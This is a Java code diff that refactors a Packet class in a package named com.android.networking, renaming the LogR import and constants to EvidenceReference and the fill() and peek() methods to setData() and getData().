@@ -12,7 +12,7 @@ package com.android.networking;
 import java.util.ArrayList;
 
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.util.Utils;
 
 /**
@@ -45,7 +45,7 @@ public class Packet {
 	 */
 	public Packet(final long unique) {
 		type = EvidenceType.NONE;
-		command = LogR.LOG_CREATE;
+		command = EvidenceReference.LOG_CREATE;
 		id = unique;
 		data = null;
 	}
@@ -53,7 +53,7 @@ public class Packet {
 	public Packet(int evidenceType, byte[] additional, byte[] data) {
 		type = evidenceType;
 		id = Utils.getRandom();
-		command = LogR.LOG_ATOMIC;
+		command = EvidenceReference.LOG_ATOMIC;
 		this.data = data;
 		this.additional = additional;
 	}
@@ -61,7 +61,7 @@ public class Packet {
 	public Packet(int evidenceType, ArrayList<byte[]> items) {
 		type = evidenceType;
 		id = Utils.getRandom();
-		command = LogR.LOG_ITEMS;
+		command = EvidenceReference.LOG_ITEMS;
 		this.items = items;
 	
 	}
@@ -120,7 +120,7 @@ public class Packet {
 	 * @param d
 	 *            the d
 	 */
-	public void fill(final byte[] d) {
+	public void setData(final byte[] d) {
 		data = d;
 	}
 
@@ -129,7 +129,7 @@ public class Packet {
 	 * 
 	 * @return the byte[]
 	 */
-	public byte[] peek() {
+	public byte[] getData() {
 		return data;
 	}
 
